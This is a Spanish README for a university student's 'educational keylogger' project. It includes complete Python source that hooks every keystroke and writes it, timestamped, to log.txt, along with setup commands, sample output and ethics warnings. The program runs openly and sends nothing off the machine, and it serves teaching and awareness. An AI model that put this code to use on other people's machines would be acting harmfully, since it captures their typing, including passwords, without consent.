# Keylogger Educativo — Proyecto Académico

Advertencia importante  
Este proyecto tiene fines exclusivamente educativos y demostrativos.  
No debe usarse con intenciones no éticas ni ilegales.  
Su propósito es comprender el funcionamiento técnico de los keyloggers y concienciar sobre los riesgos de seguridad que implican.

---

## Objetivo

Implementar en un entorno controlado un keylogger capaz de registrar las teclas presionadas por el usuario, guardando cada pulsación con su respectiva marca de tiempo (timestamp) en un archivo de texto (log.txt).

El objetivo es comprender:
- Cómo se capturan los eventos de teclado en Python.  
- Cómo funcionan los listeners de entrada.  
- Qué riesgos representa este tipo de software si se usa sin control.  
- La importancia de la ética en la práctica profesional.

---

## Archivos principales

Keylogger-test/
│
├── main.py # Código principal (registro de teclas)
├── requirements.txt # Dependencias del proyecto
├── README.md # Documentación del proyecto
└── .gitignore # Exclusión del entorno virtual y archivos sensibles


El archivo log.txt se genera automáticamente al ejecutar el programa y no debe subirse al repositorio (está incluido en .gitignore).

---

## Requisitos

- Python 3.10 o superior (recomendado)
- Librería keyboard → https://github.com/boppreh/keyboard
- Sistema operativo: Windows (ideal) o Linux real / VM  
  Nota: El módulo keyboard no funciona correctamente en WSL (Windows Subsystem for Linux)

---

## Instalación y ejecución

### En Windows (PowerShell)

# 1. Clonar el repositorio
git clone https://github.com/MasterPieceDR/Keylogger-test.git
cd Keylogger-test

# 2. Crear entorno virtual
python -m venv venv
Set-ExecutionPolicy -Scope Process -ExecutionPolicy RemoteSigned
.\venv\Scripts\Activate.ps1

# 3. Instalar dependencias
pip install -r requirements.txt

# 4. Ejecutar el programa
python main.py
Ejemplo de ejecución
Durante la ejecución, las teclas presionadas se mostrarán en la terminal y se registrarán en log.txt con la hora exacta.

Salida en terminal:

[2025-10-17 21:31:10] Tecla: A
[2025-10-17 21:31:11] Tecla: [ESPACIO]
[2025-10-17 21:31:12] Tecla: B
[2025-10-17 21:31:13] Tecla: [ENTER]
Contenido del archivo log.txt:

[2025-10-17 21:31:10] Tecla: A
[2025-10-17 21:31:11] Tecla: [ESPACIO]
[2025-10-17 21:31:12] Tecla: B
[2025-10-17 21:31:13] Tecla: [ENTER]

--- Resumen de sesión ---
Total de teclas registradas: 4
Fin de sesión: 2025-10-17 21:31:20
ADVERTENCIA: Borra este archivo después de las pruebas.
Código principal (main.py)
python
Copy code
import keyboard
from datetime import datetime

LOG_FILE = "log.txt"

def handle_key(event):
    if event.event_type == keyboard.KEY_DOWN:
        key = event.name
        if key == "space":
            key = "[ESPACIO]"
        elif key == "enter":
            key = "[ENTER]"
        elif key == "shift":
            key = "[MAYÚSCULAS]"
        elif key == "ctrl":
            key = "[CTRL]"
        elif key == "alt":
            key = "[ALT]"
        elif key == "esc":
            key = "[ESC]"
        elif len(key) == 1:
            key = key.upper()

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_line = f"[{timestamp}] Tecla: {key}\n"

        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(log_line)

        print(f"Registrado: {log_line.strip()}")

print("--------------------------------------------------")
print("Keylogger Educativo Iniciado")
print("Presiona teclas para registrar.")
print("Presiona Ctrl + C para detener y cerrar el log.")
print("--------------------------------------------------")

try:
    keyboard.hook(handle_key)
    keyboard.wait()
except KeyboardInterrupt:
    print("Keylogger detenido correctamente (Ctrl + C).")
Consideraciones éticas
Este proyecto fue desarrollado únicamente para fines educativos y de concientización dentro de entornos controlados.
Está prohibido su uso o modificación con propósitos de espionaje, robo de información o cualquier actividad que viole la privacidad de terceros.

Recomendaciones:

Ejecutarlo solo en su propio sistema.

No recoger ni compartir datos ajenos.

Borrar el archivo log.txt después de cada práctica.

Aplicar estos conocimientos para mejorar la seguridad, no para vulnerarla.

Autor
Diego Ruiz
Universidad Internacional del Ecuador (UIDE)
